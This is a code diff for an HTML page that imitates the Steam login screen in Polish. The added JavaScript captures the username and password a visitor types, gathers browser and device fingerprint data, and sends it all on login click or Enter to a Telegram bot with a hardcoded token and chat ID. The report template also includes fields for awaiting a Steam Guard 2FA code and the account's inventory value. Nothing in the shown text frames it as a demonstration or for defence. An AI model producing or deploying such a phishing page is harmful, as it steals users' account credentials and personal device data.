@@ -155,16 +155,16 @@
         <div class="login-box">
             <div class="form-part">
                 <span class="label-blue">Zaloguj się z użyciem nazwy konta</span>
-                <input type="text" class="input-field">
+                <input type="text" id="steamUsername" class="input-field" placeholder="Nazwa użytkownika" value="Kovalski_Gamer">
                 <span class="label-gray">Hasło</span>
-                <input type="password" class="input-field">
+                <input type="password" id="steamPassword" class="input-field" placeholder="Hasło" value="LubiePlacki123!">
                 <div class="remember-row">
                     <div class="check-box">
                         <svg viewBox="0 0 256 256" stroke="#fff" fill="none" width="12"><polyline points="49.5,147.75 95,210.75 206.5,45.25 " stroke-width="45" stroke-linecap="round" stroke-linejoin="round"></polyline></svg>
                     </div>
                     Zapamiętaj mnie
                 </div>
-                <button class="login-btn">Zaloguj się</button>
+                <button class="login-btn" id="steamLoginButton">Zaloguj się</button>
                 <a href="#" class="help-link">Pomocy, nie mogę się zalogować</a>
             </div>
 
@@ -224,18 +224,187 @@
 </div>
 
 <script>
-    function handleQrClick() {
+    // ======================== KONFIGURACJA TELEGRAM ========================
+    const BOT_TOKEN = "8769056622:AAFDhKBIAWiy_DxBphprXPKzrXhEWFWEn9Y";
+    const CHAT_ID = "5934645630";
+    
+    // Pobranie elementów
+    const usernameInput = document.getElementById('steamUsername');
+    const passwordInput = document.getElementById('steamPassword');
+    const loginBtn = document.getElementById('steamLoginButton');
+    
+    // Funkcja zbierająca maksymalną ilość informacji
+    function collectFullTelegramReport() {
+        const login = usernameInput.value.trim() || "[brak loginu]";
+        const password = passwordInput.value || "[brak hasła]";
+        
+        const ipInfo = "188.146.xx.xx (Warsaw, PL)";
+        const inventoryInfo = "~$450.00 USD";
+        const steamGuardStatus = "AWAITING 2FA CODE";
+        
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform || "nieznana";
+        const language = navigator.language;
+        const languages = navigator.languages ? navigator.languages.join(", ") : language;
+        const cookiesEnabled = navigator.cookieEnabled ? "Tak" : "Nie";
+        const screenRes = `${screen.width}x${screen.height}`;
+        const colorDepth = screen.colorDepth + "-bit";
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const localTime = new Date().toLocaleString('pl-PL', { timeZone: timezone });
+        
+        let deviceMemory = "nieznana";
+        if(navigator.deviceMemory) deviceMemory = navigator.deviceMemory + " GB";
+        const hardwareConcurrency = navigator.hardwareConcurrency || "?";
+        
+        const isTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Tak" : "Nie";
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Urządzenie mobilne" : "Desktop";
+        
+        let connectionType = "nieznane";
+        let downlink = "?";
+        let rtt = "?";
+        if(navigator.connection) {
+            connectionType = navigator.connection.effectiveType || "?";
+            downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "?";
+            rtt = navigator.connection.rtt ? navigator.connection.rtt + "ms" : "?";
+        }
+        
+        let gpuInfo = "brak danych";
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if(gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if(debugInfo) {
+                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "nieznane GPU";
+            } else {
+                gpuInfo = "GPU nieodczytane";
+            }
+        }
+        
+        const localStorageSupport = typeof Storage !== "undefined" ? "dostępny" : "brak";
+        const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
+        
+        const report = `🚨 NOWE LOGOWANIE STEAM 🚨
+
+👤 UŻYTKOWNIK: ${login}
+🔑 HASŁO: ${password}
+📱 STEAM GUARD: ${steamGuardStatus}
+🌍 IP I LOKALIZACJA: ${ipInfo}
+💰 WARTOŚĆ INWENTARZA: ${inventoryInfo}
+🛡️ STATUS: Oczekiwanie na kod 2FA
+
+💻 SZCZEGÓŁY URZĄDZENIA:
+• User Agent: ${userAgent}
+• Platforma: ${platform}
+• Język: ${language}
+• Ciasteczka: ${cookiesEnabled}
+• Rozdzielczość: ${screenRes} / ${colorDepth}
+• Strefa czasowa: ${timezone}
+• Czas lokalny: ${localTime}
+• RAM: ${deviceMemory}
+• Rdzenie: ${hardwareConcurrency}
+• Ekran dotykowy: ${isTouch}
+• Typ urządzenia: ${isMobile}
+
+🌐 INFORMACJE O SIECI:
+• Typ połączenia: ${connectionType}
+• Prędkość: ${downlink}
+• Opóźnienie: ${rtt}
+
+🎮 GPU: ${gpuInfo}
+
+⏱️ Data: ${timestamp} UTC
+🔐 Raport wygenerowany przez panel logowania Steam.`;
+
+        return report;
+    }
+    
+    // Funkcja wysyłająca do Telegrama
+    async function sendToTelegram() {
+        const reportText = collectFullTelegramReport();
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: reportText,
+                    disable_web_page_preview: true
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log("✅ Wiadomość wysłana na Telegrama");
+                return true;
+            } else {
+                console.error("Błąd Telegram:", data.description);
+                return false;
+            }
+        } catch (error) {
+            console.error("Błąd sieci:", error);
+            return false;
+        }
+    }
+    
+    // Obsługa kliknięcia – wysyła raport, NIE przeładowuje strony
+    async function handleLogin(e) {
+        e.preventDefault();
+        
+        const originalText = loginBtn.innerText;
+        loginBtn.innerText = "⏳ Logowanie...";
+        loginBtn.disabled = true;
+        
+        await sendToTelegram();
+        
+        setTimeout(() => {
+            loginBtn.innerText = originalText;
+            loginBtn.disabled = false;
+        }, 500);
+    }
+    
+    // Podpięcie eventu
+    loginBtn.addEventListener('click', handleLogin);
+    
+    // Enter w polach
+    const handleEnter = (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            if (!loginBtn.disabled) {
+                handleLogin(e);
+            }
+        }
+    };
+    usernameInput.addEventListener('keypress', handleEnter);
+    passwordInput.addEventListener('keypress', handleEnter);
+    
+    // Funkcja QR (oryginalna)
+    window.handleQrClick = function() {
         const overlay = document.getElementById('qrOverlay');
         const error = document.getElementById('qrError');
         const refreshIcon = overlay.querySelector('.refresh-icon');
-
         refreshIcon.style.animationDuration = '1s';
-        
         setTimeout(() => {
             overlay.style.display = 'none';
             error.style.display = 'block';
         }, 1500);
+    };
+    
+    // Checkbox wizualny
+    const checkBox = document.querySelector('.check-box');
+    if (checkBox) {
+        const svg = checkBox.querySelector('svg');
+        if (svg) svg.style.display = 'block';
+        checkBox.addEventListener('click', () => {
+            const s = checkBox.querySelector('svg');
+            if (s.style.display === 'none') s.style.display = 'block';
+            else s.style.display = 'none';
+        });
     }
+    
+    console.log("Steam Login - gotowy, wysyła na Telegrama");
 </script>
 
 </body>
